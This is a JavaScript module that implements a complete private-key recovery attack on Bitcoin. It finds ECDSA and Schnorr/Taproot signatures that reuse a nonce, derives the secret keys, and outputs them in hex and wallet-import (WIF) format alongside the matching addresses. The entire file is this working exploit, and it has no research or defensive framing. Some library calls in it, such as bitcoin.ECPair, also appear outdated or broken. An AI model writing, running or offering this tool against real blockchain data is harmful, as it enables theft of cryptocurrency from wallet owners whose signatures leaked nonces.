// private-key-solver.js - Complete solver implementation
import * as bitcoin from 'bitcoinjs-lib';
import * as ecc from 'tiny-secp256k1';
import ECPairFactory from 'ecpair';
import { modInv, SECP256K1_N, bigIntToBytes } from './crypto-utils';

bitcoin.initEccLib(ecc);
const ECPair = ECPairFactory(ecc);

export class PrivateKeySolver {
  constructor(analyzer) {
    this.analyzer = analyzer;
  }

  // Solve ECDSA private keys from nonce reuse
  solveECDSA() {
    const recoveredKeys = new Map(); // pubkey -> private key
    const recoveredNonces = new Map(); // r -> k
    
    for (const [key, sigs] of this.analyzer.ecdsaByRQ) {
      if (sigs.length < 2) continue;
      
      // Get unique (s, z) pairs
      const uniqueSigs = new Map();
      for (const sig of sigs) {
        const pairKey = `${sig.s}:${sig.z}`;
        if (!uniqueSigs.has(pairKey)) {
          uniqueSigs.set(pairKey, sig);
        }
      }
      
      if (uniqueSigs.size < 2) continue;
      
      const sigsArray = Array.from(uniqueSigs.values());
      const [r, pubkey] = key.split(':');
      const rBig = BigInt(r);
      
      // Try to recover private key from any two different signatures
      for (let i = 0; i < sigsArray.length - 1; i++) {
        for (let j = i + 1; j < sigsArray.length; j++) {
          const sig1 = sigsArray[i];
          const sig2 = sigsArray[j];
          
          // Skip if same message hash
          if (sig1.z === sig2.z) continue;
          
          try {
            // Recover k (nonce)
            // k = (z1 - z2) / (s1 - s2) mod n
            const zDiff = (sig1.z - sig2.z + SECP256K1_N) % SECP256K1_N;
            const sDiff = (sig1.s - sig2.s + SECP256K1_N) % SECP256K1_N;
            
            if (sDiff === 0n) continue;
            
            const sDiffInv = modInv(sDiff, SECP256K1_N);
            const k = (zDiff * sDiffInv) % SECP256K1_N;
            
            if (k === 0n) continue;
            
            // Recover private key
            // x = (s * k - z) / r mod n
            const sk = (sig1.s * k) % SECP256K1_N;
            const skMinusZ = (sk - sig1.z + SECP256K1_N) % SECP256K1_N;
            const rInv = modInv(rBig, SECP256K1_N);
            const x = (skMinusZ * rInv) % SECP256K1_N;
            
            if (x === 0n || x >= SECP256K1_N) continue;
            
            // Verify the recovered private key
            const keyPair = ECPair.fromPrivateKey(bigIntToBytes(x));
            const recoveredPubkey = keyPair.publicKey.toString('hex');
            
            // Check if compressed/uncompressed matches
            const compressedPubkey = keyPair.compressed ? 
              recoveredPubkey : 
              bitcoin.ECPair.fromPublicKey(Buffer.from(recoveredPubkey, 'hex'), { compressed: true }).publicKey.toString('hex');
            
            if (compressedPubkey.toLowerCase() === pubkey.toLowerCase() || 
                recoveredPubkey.toLowerCase() === pubkey.toLowerCase()) {
              recoveredKeys.set(pubkey, x);
              recoveredNonces.set(r, k);
              break;
            }
          } catch (error) {
            // Continue trying other pairs
          }
        }
        
        if (recoveredKeys.has(pubkey)) break;
      }
    }
    
    return {
      keys: Array.from(recoveredKeys.entries()).map(([pubkey, privkey]) => ({
        pubkey,
        privkey: privkey.toString(16).padStart(64, '0'),
        wif: ECPair.fromPrivateKey(bigIntToBytes(privkey)).toWIF(),
        address: bitcoin.payments.p2pkh({ 
          pubkey: Buffer.from(pubkey, 'hex') 
        }).address
      })),
      nonces: Array.from(recoveredNonces.entries()).map(([r, k]) => ({
        r,
        k: k.toString(16).padStart(64, '0')
      }))
    };
  }

  // Solve Schnorr/Taproot private keys from nonce reuse
  solveSchnorr() {
    const recoveredKeys = new Map();
    const recoveredNonces = new Map();
    
    for (const [key, sigs] of this.analyzer.schnorrByRQ) {
      if (sigs.length < 2) continue;
      
      // Get unique (s, e) pairs
      const uniqueSigs = new Map();
      for (const sig of sigs) {
        const pairKey = `${sig.s}:${sig.e}`;
        if (!uniqueSigs.has(pairKey)) {
          uniqueSigs.set(pairKey, sig);
        }
      }
      
      if (uniqueSigs.size < 2) continue;
      
      const sigsArray = Array.from(uniqueSigs.values());
      const [r_x, pubkeyXOnly] = key.split(':');
      
      // For Schnorr, we can directly compute private key from two signatures
      const sig1 = sigsArray[0];
      const sig2 = sigsArray[1];
      
      if (sig1.e === sig2.e) continue;
      
      try {
        // x = (s1 - s2) / (e1 - e2) mod n
        const sDiff = (sig1.s - sig2.s + SECP256K1_N) % SECP256K1_N;
        const eDiff = (sig1.e - sig2.e + SECP256K1_N) % SECP256K1_N;
        
        if (eDiff === 0n) continue;
        
        const eDiffInv = modInv(eDiff, SECP256K1_N);
        const x = (sDiff * eDiffInv) % SECP256K1_N;
        
        if (x === 0n || x >= SECP256K1_N) continue;
        
        // Verify the recovered private key
        const keyPair = ECPair.fromPrivateKey(bigIntToBytes(x));
        const pubkeyPoint = keyPair.publicKey.slice(1, 33); // x-only
        const recoveredXOnly = pubkeyPoint.toString('hex');
        
        if (recoveredXOnly.toLowerCase() === pubkeyXOnly.toLowerCase()) {
          recoveredKeys.set(pubkeyXOnly, x);
          
          // Recover nonce k = s - e*x mod n
          const k = (sig1.s - (sig1.e * x % SECP256K1_N) + SECP256K1_N) % SECP256K1_N;
          if (k !== 0n) {
            recoveredNonces.set(r_x, k);
          }
        }
      } catch (error) {
        // Continue with next signature pair
      }
    }
    
    return {
      keys: Array.from(recoveredKeys.entries()).map(([pubkey, privkey]) => ({
        pubkeyXOnly: pubkey,
        privkey: privkey.toString(16).padStart(64, '0'),
        address: bitcoin.payments.p2tr({
          internalPubkey: Buffer.from(pubkey, 'hex')
        }).address
      })),
      nonces: Array.from(recoveredNonces.entries()).map(([r_x, k]) => ({
        r_x,
        k: k.toString(16).padStart(64, '0')
      }))
    };
  }

  // Solve all available private keys
  solveAll() {
    return {
      ecdsa: this.solveECDSA(),
      schnorr: this.solveSchnorr()
    };
  }
}